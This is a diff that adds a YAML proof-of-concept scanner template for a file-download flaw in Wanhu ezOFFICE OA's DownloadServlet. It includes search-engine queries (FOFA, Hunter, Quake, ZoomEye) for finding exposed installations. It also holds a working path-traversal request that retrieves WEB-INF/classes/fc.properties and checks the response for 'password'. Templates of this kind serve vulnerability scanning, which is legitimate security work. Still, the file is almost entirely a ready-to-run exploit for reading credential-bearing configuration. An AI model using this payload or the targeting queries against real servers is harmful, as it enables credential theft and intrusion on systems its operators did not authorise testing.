@@ -1,0 +1,32 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="万户网络-ezOFFICE"
+    hunter-query: app.name="万户 Ezoffice OA"
+    quake-query: app:"万户ezOFFICE协同管理平台"
+    zoomeye-query: title:"万户ezOFFICE协同管理平台"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips: 
+    
+name: poc-yaml-wanhu-ezoffice-DownloadServlet-file-download
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /defaultroot/DownloadServlet?modeType=0&key=x&path=..&FileName=WEB-INF/classes/fc.properties&name=fc.properties&encrypt=x&cd&downloadAll=2
+            headers:
+            body: 
+        expression: response.status == 200 && response.raw_header.bcontains(b"fc.properties") && response.body_string.contains("password")
+
+expression: r0() 
